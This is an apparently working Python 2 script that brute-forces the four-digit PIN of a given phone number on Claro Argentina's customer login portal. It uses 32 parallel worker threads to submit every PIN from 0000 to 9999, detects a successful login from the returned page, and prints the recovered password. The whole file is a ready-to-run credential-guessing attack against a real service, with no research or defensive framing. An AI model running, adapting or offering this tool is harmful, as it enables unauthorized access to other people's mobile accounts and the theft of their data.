#!/usr/bin/env python
#-*- coding: UTF-8 -*-

import urllib2
import urllib
import cookielib
import sys
import ClientForm
from decoradores import Retry, Farm, Verbose

VERBOSE = 0
LOGINURL = ("""http://individuos.claro.com.ar/web/guest/bienvenido"""
    """?p_p_id=58&p_p_lifecycle=1&p_p_state=normal&p_p_mode=view"""
    """&p_p_col_id=column-1&p_p_col_count=1&saveLastPath=0"""
    """&_58_struts_action=%2Flogin%2Flogin""")



def print_dot(dot="·"):
    sys.stderr.write(str(dot))
    return sys.stderr.flush()


class Login:

    def __init__(self):
        debug("Instanciando Login")
        cj = cookielib.CookieJar()
        self.opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
        self._forms = {}


    @Retry(15, pause=2)
    def get_forms(self, formurl=LOGINURL):
        if formurl not in self._forms:
            moreinfo("Consiguendo un formulario")

            try:
                self._forms[formurl] = DEFAULTFORMS
            except:

                try:
                    response = self.opener.open(formurl)
                    forms = ClientForm.ParseResponse(response,
                        backwards_compat=False)
                except (urllib2.URLError, urllib2.HTTPError):
                    return None
                self._forms[formurl] = forms
        return self._forms[formurl]


    @Retry(15, pause=2)
    def __call__(self, loginNumber, password):
        if not password % 100:
            if not password % 500:
                print_dot(str(password / 100) + "%")
            else:
                print_dot()

        form = self.get_forms(LOGINURL)[0]
        debug("Probando con %s" % password)

        pass_str = "%04d" % password

        try:
            form["_58_login"] = loginNumber
            form["_58_password"] = pass_str
            html = self.opener.open(form.click()).read()
        except (urllib2.URLError, urllib2.HTTPError):
            return None
        else:
            if '/c/portal/logout' in html:
                debug("Encontrada: %s" % password)
                return password
            elif 'saveLastPath=0&_58_struts_action=%2Flogin%2Flogin' in html:
                debug("No es %s" % password)
                return False
            elif 'En este momento no podemos atender tu consulta.' in html:
                debug("Sin servicio, %s" % password)
                return None
            else:
                debug("Error desconocido")
                return html


def main(opts=None, args=None):
    sys.argv += [None, None]
    loginNumber = sys.argv.pop(1)
    fromnumber = sys.argv.pop(1) or "0"
    tonumber = sys.argv.pop(1) or "10000"

#TODO: debe verificar el servicio antes de iniciar el proceso

    farm = Farm(Login, 32, True, True)
    debug("Farm created")
    
    rango = xrange(int(fromnumber.replace("%", "00")),
        int(tonumber.replace("%", "00")))

    for number in rango:
        farm.enqueue((loginNumber, number))
    debug("Farm populated")

    farm.start()
    debug("Farm started")

    debug("Joining farm")
    result = farm.wait_eval()

    if result:
        print("¡La contraseña de %s es %s !" % (loginNumber, result))
        return 0
    else:
        error("No pude encontrar la contraseña :(")
        return 1


if __name__ == "__main__":
    error = Verbose(VERBOSE + 2, "E: ")
    warning = Verbose(VERBOSE + 1, "W: ")
    info = Verbose(VERBOSE + 0)
    moreinfo = Verbose(VERBOSE -1)
    debug = Verbose(VERBOSE - 2, "D: ")

    DEFAULTLOGIN = Login()
    DEFAULFORMS = DEFAULTLOGIN.get_forms()

    exit(main())
